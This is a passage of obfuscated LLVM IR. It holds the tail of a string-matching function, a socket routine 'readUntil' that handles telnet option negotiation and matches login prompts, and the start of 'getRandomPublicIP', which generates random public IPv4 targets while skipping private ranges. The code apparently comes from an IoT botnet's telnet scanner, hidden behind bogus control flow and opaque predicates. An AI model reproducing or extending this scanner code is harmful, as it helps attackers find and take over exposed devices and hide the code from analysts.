  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart216, label %originalBB8alteredBB

originalBBpart216:                                ; preds = %originalBB8
  br label %118

; <label>:118:                                    ; preds = %originalBBpart216, %78, %originalBBpart26, %38
  %119 = phi i1 [ true, %78 ], [ true, %originalBBpart26 ], [ true, %38 ], [ %109, %originalBBpart216 ]
  br label %120

; <label>:120:                                    ; preds = %118, %originalBBpart2
  %121 = phi i1 [ false, %originalBBpart2 ], [ %119, %118 ]
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %7, align 4
  br label %18

; <label>:125:                                    ; preds = %120
  %126 = load i8*, i8** %3, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = sub i64 0, %131
  %133 = getelementptr inbounds i8, i8* %129, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = load i8*, i8** %4, align 8
  %137 = load i32, i32* %6, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = icmp eq i32 %135, %141
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %125
  store i32 1, i32* %2, align 4
  br label %165

; <label>:144:                                    ; preds = %125
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* @x.47
  %147 = load i32, i32* @y.48
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %145
  %154 = load i32, i32* %6, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %6, align 4
  %156 = load i32, i32* @x.47
  %157 = load i32, i32* @y.48
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %11

; <label>:164:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %143
  %166 = load i32, i32* %2, align 4
  ret i32 %166

originalBBalteredBB:                              ; preds = %originalBB, %18
  %167 = load i32, i32* %5, align 4
  %168 = load i32, i32* %7, align 4
  %169 = icmp sgt i32 %167, %168
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %170 = load i8*, i8** %3, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %170, i64 %172
  %174 = load i32, i32* %7, align 4
  %175 = sext i32 %174 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %175
  %_2 = sub i64 0, 0
  %gen3 = add i64 %_2, %175
  %_4 = shl i64 0, %175
  %176 = sub i64 0, %175
  %177 = getelementptr inbounds i8, i8* %173, i64 %176
  %178 = load i8, i8* %177, align 1
  %179 = sext i8 %178 to i32
  %180 = icmp eq i32 %179, 32
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %90
  %181 = load i8*, i8** %3, align 8
  %182 = load i32, i32* %5, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8, i8* %181, i64 %183
  %185 = load i32, i32* %7, align 4
  %186 = sext i32 %185 to i64
  %_9 = sub i64 0, %186
  %gen10 = mul i64 %_9, %186
  %_11 = shl i64 0, %186
  %_12 = sub i64 0, %186
  %gen13 = mul i64 %_12, %186
  %_14 = shl i64 0, %186
  %187 = sub i64 0, %186
  %188 = getelementptr inbounds i8, i8* %184, i64 %187
  %189 = load i8, i8* %188, align 1
  %190 = sext i8 %189 to i32
  %191 = icmp eq i32 %190, 10
  br label %originalBB8

originalBB18alteredBB:                            ; preds = %originalBB18, %145
  %192 = load i32, i32* %6, align 4
  %_19 = shl i32 %192, 1
  %_20 = sub i32 %192, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 %192, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 %192, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 0, %192
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 %192, 1
  %gen29 = mul i32 %_28, 1
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %6, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = load i32, i32* @x.49
  %10 = load i32, i32* @y.50
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.__sigset_t, align 8
  %30 = alloca %struct.timeval, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 %0, i32* %18, align 4
  store i8* %1, i8** %19, align 8
  store i32 %2, i32* %20, align 4
  store i32 %3, i32* %21, align 4
  store i32 %4, i32* %22, align 4
  store i8* %5, i8** %23, align 8
  store i32 %6, i32* %24, align 4
  store i32 %7, i32* %25, align 4
  %34 = load i32, i32* %25, align 4
  store i32 %34, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %35 = load i32, i32* %21, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  store i64 %36, i64* %37, align 8
  %38 = load i32, i32* %22, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  store i64 %39, i64* %40, align 8
  store i8* null, i8** %31, align 8
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %264, %originalBBpart2
  %50 = load i32, i32* %26, align 4
  %51 = add nsw i32 %50, 2
  %52 = load i32, i32* %24, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %96

; <label>:54:                                     ; preds = %49
  %55 = load i32, i32* @x.49
  %56 = load i32, i32* @y.50
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  %64 = load i64, i64* %63, align 8
  %65 = icmp sgt i64 %64, 0
  %66 = load i32, i32* @x.49
  %67 = load i32, i32* @y.50
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %94, label %74

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i32, i32* @x.49
  %76 = load i32, i32* @y.50
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  %84 = load i64, i64* %83, align 8
  %85 = icmp sgt i64 %84, 0
  %86 = load i32, i32* @x.49
  %87 = load i32, i32* @y.50
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %94

; <label>:94:                                     ; preds = %originalBBpart28, %originalBBpart24
  %95 = phi i1 [ true, %originalBBpart24 ], [ %85, %originalBBpart28 ]
  br label %96

; <label>:96:                                     ; preds = %94, %49
  %97 = phi i1 [ false, %49 ], [ %95, %94 ]
  br i1 %97, label %98, label %265

; <label>:98:                                     ; preds = %96
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 0
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %101) #2, !srcloc !4
  %103 = extractvalue { i64, i64* } %102, 0
  %104 = extractvalue { i64, i64* } %102, 1
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %32, align 4
  %106 = ptrtoint i64* %104 to i64
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %33, align 4
  br label %108

; <label>:108:                                    ; preds = %99
  %109 = load i32, i32* @x.49
  %110 = load i32, i32* @y.50
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i32, i32* %18, align 4
  %118 = srem i32 %117, 64
  %119 = zext i32 %118 to i64
  %120 = shl i64 1, %119
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %122 = load i32, i32* %18, align 4
  %123 = sdiv i32 %122, 64
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 %124
  %126 = load i64, i64* %125, align 8
  %127 = or i64 %126, %120
  store i64 %127, i64* %125, align 8
  %128 = load i32, i32* %18, align 4
  %129 = add nsw i32 %128, 1
  %130 = call i32 @select(i32 %129, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %131 = icmp slt i32 %130, 1
  %132 = load i32, i32* @x.49
  %133 = load i32, i32* @y.50
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart258, label %originalBB10alteredBB

originalBBpart258:                                ; preds = %originalBB10
  br i1 %131, label %140, label %157

; <label>:140:                                    ; preds = %originalBBpart258
  %141 = load i32, i32* @x.49
  %142 = load i32, i32* @y.50
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %140
  %149 = load i32, i32* @x.49
  %150 = load i32, i32* @y.50
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %265

; <label>:157:                                    ; preds = %originalBBpart258
  %158 = load i8*, i8** %23, align 8
  %159 = load i32, i32* %26, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  store i8* %161, i8** %31, align 8
  %162 = load i32, i32* %18, align 4
  %163 = load i8*, i8** %31, align 8
  %164 = call i64 @recv(i32 %162, i8* %163, i64 1, i32 0)
  %165 = trunc i64 %164 to i32
  store i32 %165, i32* %27, align 4
  %166 = load i32, i32* %27, align 4
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %171, label %168

; <label>:168:                                    ; preds = %157
  %169 = load i32, i32* %27, align 4
  %170 = icmp eq i32 %169, 0
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %168, %157
  store i32 0, i32* %17, align 4
  br label %286

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* %27, align 4
  %174 = load i32, i32* %26, align 4
  %175 = add nsw i32 %174, %173
  store i32 %175, i32* %26, align 4
  %176 = load i8*, i8** %31, align 8
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 255
  br i1 %179, label %180, label %234

; <label>:180:                                    ; preds = %172
  %181 = load i32, i32* %18, align 4
  %182 = load i8*, i8** %31, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = call i64 @recv(i32 %181, i8* %183, i64 2, i32 0)
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %27, align 4
  %186 = load i32, i32* %27, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %191, label %188

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* %27, align 4
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %208

; <label>:191:                                    ; preds = %188, %180
  %192 = load i32, i32* @x.49
  %193 = load i32, i32* @y.50
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %191
  store i32 0, i32* %17, align 4
  %200 = load i32, i32* @x.49
  %201 = load i32, i32* @y.50
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %286

; <label>:208:                                    ; preds = %188
  %209 = load i32, i32* @x.49
  %210 = load i32, i32* @y.50
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %208
  %217 = load i32, i32* %27, align 4
  %218 = load i32, i32* %26, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %26, align 4
  %220 = load i32, i32* %18, align 4
  %221 = load i8*, i8** %31, align 8
  %222 = call i32 @negotiate(i32 %220, i8* %221, i32 3)
  %223 = icmp ne i32 %222, 0
  %224 = load i32, i32* @x.49
  %225 = load i32, i32* @y.50
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart279, label %originalBB68alteredBB

originalBBpart279:                                ; preds = %originalBB68
  br i1 %223, label %233, label %232

; <label>:232:                                    ; preds = %originalBBpart279
  store i32 0, i32* %17, align 4
  br label %286

; <label>:233:                                    ; preds = %originalBBpart279
  br label %264

; <label>:234:                                    ; preds = %172
  %235 = load i8*, i8** %23, align 8
  %236 = load i8*, i8** %19, align 8
  %237 = call i8* @strstr(i8* %235, i8* %236) #10
  %238 = icmp ne i8* %237, null
  br i1 %238, label %246, label %239

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %20, align 4
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %263

; <label>:242:                                    ; preds = %239
  %243 = load i8*, i8** %23, align 8
  %244 = call i32 @matchPrompt(i8* %243)
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %263

; <label>:246:                                    ; preds = %242, %234
  %247 = load i32, i32* @x.49
  %248 = load i32, i32* @y.50
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %246
  store i32 1, i32* %28, align 4
  %255 = load i32, i32* @x.49
  %256 = load i32, i32* @y.50
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %265

; <label>:263:                                    ; preds = %242, %239
  br label %264

; <label>:264:                                    ; preds = %263, %233
  br label %49

; <label>:265:                                    ; preds = %originalBBpart283, %originalBBpart262, %96
  %266 = load i32, i32* @x.49
  %267 = load i32, i32* @y.50
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %265
  %274 = load i32, i32* %28, align 4
  %275 = icmp ne i32 %274, 0
  %276 = load i32, i32* @x.49
  %277 = load i32, i32* @y.50
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %275, label %284, label %285

; <label>:284:                                    ; preds = %originalBBpart287
  store i32 1, i32* %17, align 4
  br label %286

; <label>:285:                                    ; preds = %originalBBpart287
  store i32 0, i32* %17, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %284, %232, %originalBBpart266, %171
  %287 = load i32, i32* %17, align 4
  ret i32 %287

originalBBalteredBB:                              ; preds = %originalBB, %8
  %288 = alloca i32, align 4
  %289 = alloca i32, align 4
  %290 = alloca i8*, align 8
  %291 = alloca i32, align 4
  %292 = alloca i32, align 4
  %293 = alloca i32, align 4
  %294 = alloca i8*, align 8
  %295 = alloca i32, align 4
  %296 = alloca i32, align 4
  %297 = alloca i32, align 4
  %298 = alloca i32, align 4
  %299 = alloca i32, align 4
  %300 = alloca %struct.__sigset_t, align 8
  %301 = alloca %struct.timeval, align 8
  %302 = alloca i8*, align 8
  %303 = alloca i32, align 4
  %304 = alloca i32, align 4
  store i32 %0, i32* %289, align 4
  store i8* %1, i8** %290, align 8
  store i32 %2, i32* %291, align 4
  store i32 %3, i32* %292, align 4
  store i32 %4, i32* %293, align 4
  store i8* %5, i8** %294, align 8
  store i32 %6, i32* %295, align 4
  store i32 %7, i32* %296, align 4
  %305 = load i32, i32* %296, align 4
  store i32 %305, i32* %297, align 4
  store i32 0, i32* %298, align 4
  store i32 0, i32* %299, align 4
  %306 = load i32, i32* %292, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.timeval, %struct.timeval* %301, i32 0, i32 0
  store i64 %307, i64* %308, align 8
  %309 = load i32, i32* %293, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.timeval, %struct.timeval* %301, i32 0, i32 1
  store i64 %310, i64* %311, align 8
  store i8* null, i8** %302, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %312 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  %313 = load i64, i64* %312, align 8
  %314 = icmp sgt i64 %313, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %315 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  %316 = load i64, i64* %315, align 8
  %317 = icmp sgt i64 %316, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %318 = load i32, i32* %18, align 4
  %_ = sub i32 %318, 64
  %gen = mul i32 %_, 64
  %_11 = sub i32 %318, 64
  %gen12 = mul i32 %_11, 64
  %_13 = sub i32 %318, 64
  %gen14 = mul i32 %_13, 64
  %_15 = sub i32 %318, 64
  %gen16 = mul i32 %_15, 64
  %_17 = sub i32 %318, 64
  %gen18 = mul i32 %_17, 64
  %319 = srem i32 %318, 64
  %320 = zext i32 %319 to i64
  %_19 = sub i64 1, %320
  %gen20 = mul i64 %_19, %320
  %_21 = sub i64 1, %320
  %gen22 = mul i64 %_21, %320
  %321 = shl i64 1, %320
  %322 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %323 = load i32, i32* %18, align 4
  %_23 = sub i32 %323, 64
  %gen24 = mul i32 %_23, 64
  %_25 = sub i32 %323, 64
  %gen26 = mul i32 %_25, 64
  %_27 = sub i32 %323, 64
  %gen28 = mul i32 %_27, 64
  %_29 = sub i32 %323, 64
  %gen30 = mul i32 %_29, 64
  %_31 = sub i32 0, %323
  %gen32 = add i32 %_31, 64
  %_33 = sub i32 0, %323
  %gen34 = add i32 %_33, 64
  %324 = sdiv i32 %323, 64
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds [16 x i64], [16 x i64]* %322, i64 0, i64 %325
  %327 = load i64, i64* %326, align 8
  %_35 = sub i64 %327, %321
  %gen36 = mul i64 %_35, %321
  %_37 = sub i64 %327, %321
  %gen38 = mul i64 %_37, %321
  %_39 = shl i64 %327, %321
  %_40 = shl i64 %327, %321
  %_41 = shl i64 %327, %321
  %_42 = sub i64 0, %327
  %gen43 = add i64 %_42, %321
  %_44 = shl i64 %327, %321
  %_45 = sub i64 0, %327
  %gen46 = add i64 %_45, %321
  %328 = or i64 %327, %321
  store i64 %328, i64* %326, align 8
  %329 = load i32, i32* %18, align 4
  %_47 = shl i32 %329, 1
  %_48 = shl i32 %329, 1
  %_49 = shl i32 %329, 1
  %_50 = sub i32 %329, 1
  %gen51 = mul i32 %_50, 1
  %_52 = shl i32 %329, 1
  %_53 = sub i32 %329, 1
  %gen54 = mul i32 %_53, 1
  %_55 = sub i32 0, %329
  %gen56 = add i32 %_55, 1
  %330 = add nsw i32 %329, 1
  %331 = call i32 @select(i32 %330, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %332 = icmp slt i32 %331, 1
  br label %originalBB10

originalBB60alteredBB:                            ; preds = %originalBB60, %140
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %191
  store i32 0, i32* %17, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %208
  %333 = load i32, i32* %27, align 4
  %334 = load i32, i32* %26, align 4
  %_69 = sub i32 0, %334
  %gen70 = add i32 %_69, %333
  %_71 = sub i32 0, %334
  %gen72 = add i32 %_71, %333
  %_73 = sub i32 0, %334
  %gen74 = add i32 %_73, %333
  %_75 = sub i32 %334, %333
  %gen76 = mul i32 %_75, %333
  %_77 = shl i32 %334, %333
  %335 = add nsw i32 %334, %333
  store i32 %335, i32* %26, align 4
  %336 = load i32, i32* %18, align 4
  %337 = load i8*, i8** %31, align 8
  %338 = call i32 @negotiate(i32 %336, i8* %337, i32 3)
  %339 = icmp ne i32 %338, 0
  br label %originalBB68

originalBB81alteredBB:                            ; preds = %originalBB81, %246
  store i32 1, i32* %28, align 4
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %265
  %340 = load i32, i32* %28, align 4
  %341 = icmp ne i32 %340, 0
  br label %originalBB85
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 16, i32 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i32 0, i32 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %26 = call i32 @inet_addr(i8* %25) #2
  store i32 %26, i32* %1, align 4
  br label %337

; <label>:27:                                     ; preds = %7, %0
  %28 = call i32 @rand() #2
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %31 = call i32 @rand() #2
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %37

; <label>:37:                                     ; preds = %originalBBpart255, %27
  %38 = load i32, i32* @x.51
  %39 = load i32, i32* @y.52
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 0
  %49 = load i32, i32* @x.51
  %50 = load i32, i32* @y.52
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %281, label %57

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br i1 %60, label %281, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 100
  br i1 %64, label %65, label %73

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sge i32 %67, 64
  br i1 %68, label %69, label %73

; <label>:69:                                     ; preds = %65
